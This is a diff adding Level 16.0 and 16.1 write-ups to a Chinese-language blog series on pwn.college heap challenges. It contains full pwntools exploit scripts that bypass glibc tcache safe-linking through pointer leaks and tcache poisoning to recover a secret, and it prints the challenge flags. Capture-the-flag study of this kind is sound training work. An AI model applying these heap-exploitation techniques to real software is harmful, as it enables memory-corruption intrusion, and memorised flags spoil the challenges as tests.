@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-10-07
+updated: 2025-10-10
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -1785,7 +1785,7 @@ if __name__ == "__main__":
 
 ## Write-up
 
-和上题一样，但是这次不能分配到 secret 附近了，泄漏完全不可能。不过还是可以利用 `tcache_get` 清空 NULL 的特性将 secret 完全清空，这样我们就知道 secret 为 NULL 了。
+和上题一样，但是这次不能分配到 secret 附近了，泄漏完全不可能。不过还是可以利用 `tcache_get` 清空 key 的特性将 secret 完全清空，这样我们就知道 secret 为 NULL 了。
 
 ## Exploit
 
@@ -3579,3 +3579,311 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{sqd-yJZ1_DJOrzpwErrz-Y_4Jw1.0FMwQDL5cTNxgzW}`]
+
+# Level 16.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Revisit a prior challenge, now with TCACHE safe-linking.
+
+## Write-up
+
+Description 已经说的很清楚了，就是前面某个 challenge 的修订版，safe-linking 是 2.32 加入的，这个 chall 使用的是 2.35，但是区别不大，safe-linking 一直到现在最新的 2.42 都没怎么变过。
+
+没学过 safe-linking 的可以看我写的 [解链之诗：堆上咒语的逆诵](/posts/pwn-notes/pwn-trick-notes/#解链之诗堆上咒语的逆诵)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level16.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode())
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+
+    puts(0)
+    target.recvuntil(b"Data: ")
+    mangled = int.from_bytes(target.recvline().strip(), "little")
+
+    puts(1)
+    target.recvuntil(b"Data: ")
+    pos = int.from_bytes(target.recvline().strip(), "little")
+    heap = demangle(pos, mangled)
+
+    secret = elf.bss() + 0x27B60
+    secret_mangled_1 = mangle(pos, secret)
+    secret_mangled_2 = mangle(pos, (secret - 0x8))
+
+    target.success(f"pos: {hex(pos)}")
+    target.success(f"mangled: {hex(mangled)}")
+    target.success(f"heap: {hex(heap)}")
+    target.success(f"secret: {hex(secret)}")
+    target.success(f"secret_mangled_1: {hex(secret_mangled_1)}")
+    target.success(f"secret_mangled_2: {hex(secret_mangled_2)}")
+
+    scanf(0, flat(secret_mangled_1))
+    malloc(0, 0)
+
+    # the following malloc will be done 2 things:
+    # 1/ zero out the last 8 bytes secret
+    # 2/ let the first 8 bytes secret value to be the appropriate tcache bin's
+    #    header
+    malloc(0, 0)
+
+    malloc(0, 0)
+    # now the following free will use the value left on tcache bin header,
+    # which is the secret value, to fill the fd
+    free(0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret_mangled = int.from_bytes(target.recv(8), "little")
+    secret_demangled = demangle(pos, secret_mangled)
+    target.success(f"secret_demangled: {hex(secret_demangled)}")
+
+    secret = demangle(secret, secret_demangled, 0)
+    target.success(f"secret: {hex(secret)}")
+
+    send_flag(flat(secret, 0).decode())
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{MWVB7nml1ki-wvzXebiEIEuESuU.dhDO0MDL5cTNxgzW}`]
+
+# Level 16.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Revisit a prior challenge, now with TCACHE safe-linking.
+
+## Write-up
+
+参见 [Level 16.0](#level-160)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level16.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def send_flag(secret):
+    target.sendlineafter(b": ", b"send_flag")
+    target.sendlineafter(b"Secret: ", str(secret).encode())
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    malloc(1, 0)
+    free(1)
+    free(0)
+
+    puts(0)
+    target.recvuntil(b"Data: ")
+    mangled = int.from_bytes(target.recvline().strip(), "little")
+
+    puts(1)
+    target.recvuntil(b"Data: ")
+    pos = int.from_bytes(target.recvline().strip(), "little")
+    heap = demangle(pos, mangled)
+
+    secret = elf.bss() + 0x1CE90
+    secret_mangled_1 = mangle(pos, secret)
+    secret_mangled_2 = mangle(pos, (secret - 0x8))
+
+    target.success(f"pos: {hex(pos)}")
+    target.success(f"mangled: {hex(mangled)}")
+    target.success(f"heap: {hex(heap)}")
+    target.success(f"secret: {hex(secret)}")
+    target.success(f"secret_mangled_1: {hex(secret_mangled_1)}")
+    target.success(f"secret_mangled_2: {hex(secret_mangled_2)}")
+
+    scanf(0, flat(secret_mangled_1))
+    malloc(0, 0)
+
+    # the following malloc will be done 2 things:
+    # 1/ zero out the last 8 bytes secret
+    # 2/ let the first 8 bytes secret value to be the appropriate tcache bin's
+    #    header
+    malloc(0, 0)
+
+    malloc(0, 0)
+    # now the following free will use the value left on tcache bin header,
+    # which is the secret value, to fill the fd
+    free(0)
+    puts(0)
+
+    target.recvuntil(b"Data: ")
+    secret_mangled = int.from_bytes(target.recv(8), "little")
+    secret_demangled = demangle(pos, secret_mangled)
+    target.success(f"secret_demangled: {hex(secret_demangled)}")
+
+    secret = demangle(secret, secret_demangled, 0)
+    target.success(f"secret: {hex(secret)}")
+
+    send_flag(flat(secret, 0).decode())
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:sopiler[`pwn.college{ktet0NEaj6TQuRma_FkmhYKm5rq.dlDO0MDL5cTNxgzW}`]
